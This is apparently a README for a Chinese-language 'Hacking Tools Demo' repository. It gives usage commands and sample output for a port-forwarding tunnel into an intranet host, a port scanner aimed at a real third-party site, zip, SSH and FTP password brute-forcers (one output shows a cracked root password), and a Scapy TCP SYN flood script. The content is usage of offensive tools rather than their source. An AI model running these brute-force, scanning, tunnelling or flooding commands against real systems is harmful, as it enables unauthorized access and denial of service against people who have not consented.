# Hacking Tools Demo
simple hack tools 

### TcpPortForward.py 端口转发tool
```
使用场景:

一：
A服务器在内网，公网无法直接访问这台服务器，但是A服务器可以联网访问公网的B服务器（假设IP为222.2.2.2）。
我们也可以访问公网的B服务器。我们的目标是访问A服务器的22端口。那么可以这样：

1. 在B服务器上运行：
./TcpPortForward.py l:10001 l:10002
表示在本地监听了10001与10002两个端口，这样，这两个端口就可以互相传输数据了。

2. 在A服务器上运行：
./TcpPortForward.py c:localhost:22 c:222.2.2.2:10001
表示连接本地的22端口与B服务器的10001端口，这两个端口也可以互相传输数据了。

3. 然后我们就可以这样来访问A服务器的22端口了：
ssh 222.2.2.2 -p 10002
原理很简单，这个命令执行后，B服务器的10002端口接收到的任何数据都会传给10001端口，此时，A服务器是连接了B服务器的10001端口的，数据就会传给A服务器，最终进入A服务器的22端口。

二：
不用更多举例了，TcpPortForward.py的l与c两个参数可以进行灵活的两两组合，多台服务器之间只要搞明白数据流方向，那么就能满足很多场景的需求。
```



### zipattack.py zip加密文件暴力破解

```
帮助说明：  python zipattack.py -h

测试：
zip test.zip *.gif -e 

进行暴力破解：
python zipattack.py -f test.zip -d password.txt
```


### createDict.py 生成一个简单的密码破解字典
```
python createDict.py 

按ctrl+c 停止生成
```

### PortScan.py 多线程端口扫描器
```
More Help: PortScan.py -h

测试:
	python PortScan.py -H www.baidu.com -p 80 443 110
	➜  py python PortScan.py -H www.baidu.com -p 80 443 110 
		[+] Scan Results for: 119.75.218.70
		Scanning port 443
		Scanning port 110
		Scanning port 80
		[+]443/tcp open
		[+] HTTP/1.1 302 Moved Temporarily
		Server: bfe/1.0.8.18
		Date: Sun, 06 Nov 2016 08:43:40 GMT
		Content-T
		[-]110/tcp closed
		[-]80/tcp closed
	As you can see , www.baidu.com port 443 is open ,but port 80 show closed , baidu have security scan strategy ? Because Telnet www.baidu.com 80 success
	You can Test another website
	Also, You can local test , The python script support domain or ip mode
	Example:
		python PortScan.py -H 127.0.0.1 -p 80
	Author By Lock 
```

### sshAttack.py 多线程ssh密码暴力破解
```
测试：
	➜  py python sshAttack.py -h                                                    
		Usage: -H <target host> -u <user> -f <password list>

		Options:
		  -h, --help     show this help message and exit
		  -H TGTHOST     specify target host
		  -f PASSWDFILE  specify password file
		  -u USER        specify the user
		  -c COUNT       specify the max ssh connect count , default 5
	
	py python sshAttack.py -H 192.168.2.201 -u zhanghe -f /Users/lock/1.txt -c 20
	-c 用户测试指定ssh链接数，具体根据ssh config 文件判断

例：
➜  py python sshAttack.py -H 192.168.1.100 -u root -f password.md -c 20
		[-] Testing: 1111
		[-] Testing: 2222
		[-] Testing: 3333
		[-] Testing: 111111
		[-] Testing: 123123
		[-] Testing: 123456
		[+] Good , Key Found: 123456
```

### ftpAttack.py 多线程ftp密码暴力破解
```
测试：
➜  py python ftpAttack.py -h
	Usage: -H <target host> -f <password list>

	Options:
	  -h, --help     show this help message and exit
	  -H TGTHOST     specify target host
	  -f PASSWDFILE  specify password file,like username:password format file
	  -d DELAY       attack time delay set default 1s

➜  py python ftpAttack.py -H 127.0.0.1 -f userpass.md -d 1

	[-] 127.0.0.1 FTP Anonymous Logon Failed.
	[+] Trying: root/aaa

	[-] Could not brute force FTP credentials.

	[+] Trying: lock/mmm

	[-] Could not brute force FTP credentials.
	[+] Trying: alice/123


	[-] Could not brute force FTP credentials.

	The default test delay time is 0s , test default account is anonymous , if success, will show user name and password.
	userpass.md is username and password file,the file format like below:
		root:123
		hello:456
		alice:789
		test:12345
```

### synFlood.py 一个简单的 TCP SYN 洪水攻击 python版
```
More Detail:
python synFlood.py -h
1,用 Scapy 简单的复制一个 TCP SYN 洪水攻击，将制作一些 IP 数据包,  TCP 513 目标端口。
2,运行攻击发送 TCP SYN 数据包耗尽目标主机资源，填满它的连接队列，基本瘫 痪目标发送 TCP 重置包的能力。
3,netstat -an 大量的半链接状态 SYN_RECV

可能需要的依赖：
brew install --with-python libdnet

pip install scapy
pip install pcapy
pip install pydumbnet

执行效果:
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
....
```
